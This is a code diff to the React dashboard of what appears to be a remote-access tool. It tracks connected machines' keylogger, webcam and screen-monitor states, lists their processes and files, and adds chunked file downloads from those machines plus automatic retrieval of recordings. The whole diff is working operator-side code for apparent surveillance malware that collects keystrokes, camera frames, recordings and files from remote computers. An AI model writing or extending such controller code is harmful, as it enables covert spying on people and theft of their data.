@@ -42,6 +42,37 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
 
   const wsClientRef = useRef<GatewayWsClient | null>(null);
   const pingIntervalRef = useRef<any>(null);
+  const currentDownloadRef = useRef<{
+    path: string,
+    name: string,
+    chunks: { seq: number, data: ArrayBuffer, isLast: boolean }[]
+  } | null>(null);
+
+  // Download completion logic
+  const finishDownload = useCallback(() => {
+    if (!currentDownloadRef.current) return;
+
+    try {
+      // Sort chunks by sequence number to ensure order
+      const sortedChunks = [...currentDownloadRef.current.chunks].sort((a, b) => a.seq - b.seq);
+      const allChunks = sortedChunks.map(c => c.data);
+
+      const blob = new Blob(allChunks, { type: 'application/octet-stream' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = currentDownloadRef.current.name;
+      document.body.appendChild(a);
+      a.click();
+      document.body.removeChild(a);
+      URL.revokeObjectURL(url);
+      console.log(`[Download] Finished: ${currentDownloadRef.current.name} (${allChunks.length} chunks)`);
+    } catch (err) {
+      console.error('Download assembly failed:', err);
+    } finally {
+      currentDownloadRef.current = null;
+    }
+  }, []);
 
   // Create default client
   const createDefaultClient = useCallback((id: number): Client => ({
@@ -56,11 +87,13 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
     processes: [],
     apps: [],
     files: [],
+    filesCache: new Map(),
     currentPath: '.',
     state: {
       monitor: 'idle',
       webcam: 'idle',
       keylogger: 'idle',
+      fileTransfer: 'idle',
     },
   }), []);
 
@@ -96,6 +129,23 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
           } else if (channel === 0x02) {
             if (client.webcamFrame) URL.revokeObjectURL(client.webcamFrame);
             client = { ...client, webcamFrame: url };
+          }
+        }
+      } else if (ev.kind === 'file') {
+        // Binary File Chunk - High Performance
+        // Format: [4B Sequence][1B IsLast][Raw Data]
+        if (ev.payload.byteLength >= 5) {
+          const view = new DataView(ev.payload);
+          const seq = view.getUint32(0, false);
+          const isLast = view.getUint8(4) === 1;
+          const data = ev.payload.slice(5);
+
+          if (currentDownloadRef.current) {
+            currentDownloadRef.current.chunks.push({ seq, data, isLast });
+            if (isLast) {
+              finishDownload();
+              client = { ...client, state: { ...client.state, fileTransfer: 'idle' } };
+            }
           }
         }
       } else if (ev.kind === 'text') {
@@ -142,6 +192,10 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
         if (state === 'STARTING') newState.keylogger = 'starting';
         else if (state === 'STARTED') newState.keylogger = 'active';
         else if (state === 'STOPPED') newState.keylogger = 'idle';
+      } else if (feature === 'FILE_UPLOAD_READY') {
+        newState.fileTransfer = 'uploading';
+      } else if (feature === 'FILE_UPLOAD_COMPLETE' || feature === 'FILE_UPLOAD_CANCELLED') {
+        newState.fileTransfer = 'idle';
       }
 
       return { ...client, state: newState };
@@ -154,7 +208,12 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
       return { ...client, keylogs: [...client.keylogs, entry] };
     }
 
-    // Process list
+    // Clear keylogs (client-side action)
+    if (text === 'STATUS:KEYLOGS_CLEARED' || text.startsWith('DATA:CLEAR_KEYLOGS')) {
+      return { ...client, keylogs: [] };
+    }
+
+    // Process list - Format: PID|Name|CPU|MemoryKB|Exec|Status
     if (text.startsWith('DATA:PROCS:')) {
       const payload = text.substring(11);
       const processes: Process[] = payload.split(';').filter(Boolean).map(item => {
@@ -163,9 +222,9 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
           pid: parseInt(parts[0], 10) || 0,
           name: parts[1] || '',
           user: 'User',
-          cmd: parts[3] || parts[1] || '',
-          cpu: 0,
-          memory: 0,
+          cmd: parts[4] || parts[1] || '',
+          cpu: parseFloat(parts[2]) || 0,
+          memory: parseInt(parts[3], 10) || 0, // KB
           status: 'Running' as const,
         };
       });
@@ -192,10 +251,10 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
 
     // File list
     if (text.startsWith('DATA:FILES:')) {
+      console.log('[FILES] Received at:', Date.now(), 'length:', text.length);
       try {
         const json = text.substring(11);
         const rawFiles = JSON.parse(json);
-        console.log('[FE-DEBUG] Raw Files:', rawFiles.slice(0, 2));
 
         const files: FileEntry[] = rawFiles.map((f: any) => {
           // Robust directory detection
@@ -209,15 +268,102 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
             extension: f.name.includes('.') ? f.name.split('.').pop() : undefined
           };
         });
-        return { ...client, files };
+
+        // Also store in cache for the current path
+        const newCache = new Map(client.filesCache);
+        newCache.set(client.currentPath, files);
+        return { ...client, files, filesCache: newCache };
       } catch (err) {
         console.error('Failed to parse file list:', err);
       }
     }
 
+    // Prefetched subdirectory file list (Fixed JSON format)
+    if (text.startsWith('DATA:FILES_PREFETCH_JSON:')) {
+      try {
+        const json = text.substring(25);
+        const data = JSON.parse(json);
+        const prefetchPath = data.path;
+        const rawFiles = data.files;
+
+        const prefetchedFiles: FileEntry[] = rawFiles.map((f: any) => {
+          const isDir = f.dir === true || f.dir === 'true' || f.dir === 1 ||
+                        f.is_directory === true || f.isDir === true;
+          return {
+            name: f.name,
+            path: f.path,
+            size: f.size,
+            type: isDir ? 'folder' : 'file',
+            extension: f.name.includes('.') ? f.name.split('.').pop() : undefined
+          };
+        });
+
+        const newCache = new Map(client.filesCache);
+        newCache.set(prefetchPath, prefetchedFiles);
+        return { ...client, filesCache: newCache };
+      } catch (err) {
+        console.error('Failed to parse prefetched JSON file list:', err);
+      }
+    }
+
+    // Prefetched subdirectory file list (Legacy - kept for compatibility)
+    if (text.startsWith('DATA:FILES_PREFETCH:')) {
+      // Legacy format skipped/ignored to avoid parsing issues
+      return client;
+    }
+
+    // File download handling
+    if (text.startsWith('DATA:FILE_DOWNLOAD_START:')) {
+      const payload = text.substring(25);
+      const [path] = payload.split('|');
+      const name = path.split(/[\\/]/).pop() || 'download';
+      currentDownloadRef.current = { path, name, chunks: [] };
+      return { ...client, state: { ...client.state, fileTransfer: 'downloading' } };
+    }
+
+    if (text.startsWith('DATA:FILE_CHUNK:')) {
+      if (currentDownloadRef.current) {
+        const payload = text.substring(16);
+        const parts = payload.split('|');
+        if (parts.length >= 4) {
+          const isLast = parts[2] === '1';
+          const b64 = parts[3];
+
+          // Convert b64 to ArrayBuffer for unified handling
+          const binaryString = atob(b64);
+          const bytes = new Uint8Array(binaryString.length);
+          for (let i = 0; i < binaryString.length; i++) {
+            bytes[i] = binaryString.charCodeAt(i);
+          }
+          currentDownloadRef.current.chunks.push({ seq: parseInt(parts[0], 10), data: bytes.buffer, isLast });
+
+          if (isLast) {
+            finishDownload();
+            return { ...client, state: { ...client.state, fileTransfer: 'idle' } };
+          }
+        }
+      }
+      return client;
+    }
+
+    if (text.startsWith('DATA:FILE_DOWNLOAD_END:')) {
+      currentDownloadRef.current = null;
+      return { ...client, state: { ...client.state, fileTransfer: 'idle' } };
+    }
+
+    // Recording ready - auto-trigger download
+    if (text.startsWith('DATA:RECORDING_READY:')) {
+      const recordingPath = text.substring(21);
+      console.log('[Recording] Ready:', recordingPath);
+      // Trigger file download for the recording
+      if (wsClientRef.current && client) {
+        wsClientRef.current.sendText(client.id, `file_download ${recordingPath}`);
+      }
+      return client;
+    }
+
     // Error handling
     if (text.startsWith('ERROR:')) {
-      console.error(`[FE-DEBUG] Backend Error: ${text}`);
       return { ...client, logs: [...client.logs, `❌ ${text}`] };
     }
 
@@ -296,8 +442,11 @@ export function GatewayProvider({ children }: GatewayProviderProps) {
 
   // Send command to active client
   const sendCommand = useCallback((command: string) => {
+    console.log(`[GatewayContext] sendCommand: ${command} (activeClientId: ${activeClientId})`);
     if (activeClientId && wsClientRef.current?.isConnected()) {
       wsClientRef.current.sendText(activeClientId, command);
+    } else {
+      console.warn(`[GatewayContext] FAILED to send command: ${command}. wsConnected: ${wsClientRef.current?.isConnected()}`);
     }
   }, [activeClientId]);
 
